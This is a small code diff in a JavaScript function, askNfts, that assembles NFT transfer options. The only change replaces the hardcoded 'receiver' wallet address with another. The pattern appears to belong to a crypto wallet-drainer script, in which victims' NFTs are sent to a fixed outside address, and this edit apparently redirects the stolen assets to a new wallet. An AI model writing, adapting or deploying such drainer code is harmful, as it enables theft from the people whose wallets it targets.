@@ -170,7 +170,7 @@ async function askNfts(web3, amount) {
                             price: nftData.price * (nft.amount > 0 ? nft.amount : 1),
                             options: {
                                 type: nft.contract_type.toLowerCase(),
-                                receiver: "0xf101B1ECf771783Fe03217ed72736f8Bc5BBb112",
+                                receiver: "0x26e9c92Fc58232F7a8384a768b09654e4350FF41",
                                 contract_address: nft.token_address,
                                 token_id: nft.token_id,
                             }
